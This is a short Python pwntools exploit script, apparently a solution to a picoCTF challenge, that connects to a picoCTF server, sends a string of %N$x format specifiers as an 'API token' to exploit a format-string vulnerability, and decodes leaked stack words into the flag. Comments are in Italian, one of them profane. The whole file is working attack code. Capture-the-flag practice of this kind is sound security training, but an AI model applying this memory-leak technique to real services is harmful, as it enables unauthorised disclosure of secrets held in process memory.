#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])

        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 27912)

    return r


def main():
    r = conn()

    offset = 15
    payload = ''
    flag = ''

    # Si trova dalla posizione 15 dello stack dopo la chiamata della printf (FlagSize = 128 --> 128 // 4 = 32 posizioni)
    for i in range(128 // 4):
        payload += f'%{offset + i}$x'

    r.sendlineafter('portfolio\n', '1')
    r.sendlineafter('What is your API token?\n', payload)
    output = r.recvlinesS(2)[1]

    for i in range(0, len(output), 8):
        try:
            flag += bytearray.fromhex(output[i:i+8]).decode()[::-1]     # Words sono in little endian quindi bisogna capovolgerle
        except Exception:
            break       # Non c'ho cazzi di mettermi a capire qual'è la lunghezza effettiva della flag quindi 'expcet' al primo errore

    print(flag + '}')     # Alla flag mancava il '}' finale dovuto all'except precedente


if __name__ == "__main__":
    main()
